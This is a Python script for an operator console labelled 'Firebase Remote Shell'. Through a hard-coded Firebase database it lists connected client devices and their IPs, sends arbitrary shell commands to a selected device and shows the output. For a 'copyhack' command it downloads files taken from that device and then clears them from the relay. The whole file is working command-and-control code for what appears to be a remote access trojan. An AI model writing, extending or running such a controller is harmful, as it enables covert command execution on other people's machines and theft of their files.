import requests
import time
import base64
import os

FIREBASE_URL = "https://client-server-connection-446b1-default-rtdb.firebaseio.com"

def list_devices():
    response = requests.get(f"{FIREBASE_URL}/clients.json")
    devices = response.json() or {}
    print("\nAvailable Devices:")
    for i, (device_id, device_data) in enumerate(devices.items(), 1):
        ip = device_data.get('ip', 'N/A')
        last_online = device_data.get('last_online', 'N/A')
        print(f"{i}. {device_id} ({ip}) - Last online: {last_online}")

def send_command(device_id, command):
    requests.patch(f"{FIREBASE_URL}/commands/{device_id}.json", json={"command": command, "output": "", "status": "pending"})
    print(f"Command sent to {device_id}. Waiting for response...")
    
    for _ in range(10):  # Wait 10 seconds max
        response = requests.get(f"{FIREBASE_URL}/commands/{device_id}.json").json() or {}
        if response.get("status") == "completed":
            print("\nOutput:")
            print(response.get("output", ""))
            
            # Check if this was a copyhack command and handle file retrieval
            if command.startswith("copyhack"):
                handle_copyhack_file(device_id)
            
            return
        time.sleep(1)
    print("No response received")

def handle_copyhack_file(device_id):
    """Check for and retrieve files from copyhack command"""
    # Check if file data exists in Firebase
    response = requests.get(f"{FIREBASE_URL}/clients/{device_id}/file.json")
    file_data = response.json() or {}
    
    if file_data and file_data.get('content'):
        print(f"\nFile found from {device_id}: {file_data.get('name')}")
        
        # Create output directory if it doesn't exist
        output_dir = "./output/"
        os.makedirs(output_dir, exist_ok=True)
        
        # Decode base64 content
        try:
            file_content = base64.b64decode(file_data['content'])
            filename = file_data['name']
            
            # Save file to output directory
            file_path = os.path.join(output_dir, filename)
            with open(file_path, 'wb') as f:
                f.write(file_content)
            
            print(f"File saved to: {file_path}")
            print(f"Size: {len(file_content)} bytes")
            
            # Clear the file data from Firebase
            requests.patch(f"{FIREBASE_URL}/clients/{device_id}.json", json={"file": None})
            print("File data cleared from Firebase")
            
        except Exception as e:
            print(f"Error processing file: {e}")
    else:
        print("No file data found in Firebase")

def main():
    print("Firebase Remote Shell (type 'exit' to quit, 'back' to device selection)")
    
    # Create output directory if it doesn't exist
    os.makedirs("./output/", exist_ok=True)
    
    while True:
        list_devices()
        device_num = input("\nSelect device number (or 'exit'): ")
        
        if device_num.lower() == 'exit':
            break
        
        if not device_num.isdigit():
            print("Please enter a number")
            continue
            
        devices = requests.get(f"{FIREBASE_URL}/clients.json").json() or {}
        device_list = list(devices.keys())
        
        if not device_list or int(device_num) < 1 or int(device_num) > len(device_list):
            print("Invalid device number")
            continue
        
        device_id = device_list[int(device_num)-1]
        
        while True:
            command = input(f"\n[{device_id}] $ ")
            if command.lower() == 'exit':
                return
            if command.lower() == 'back':
                break
            if command:
                command = command.strip()
                if command.startswith("cls"):
                    print("\033[H\033[J", end="")
                else:
                    send_command(device_id, command)

if __name__ == "__main__":
    main()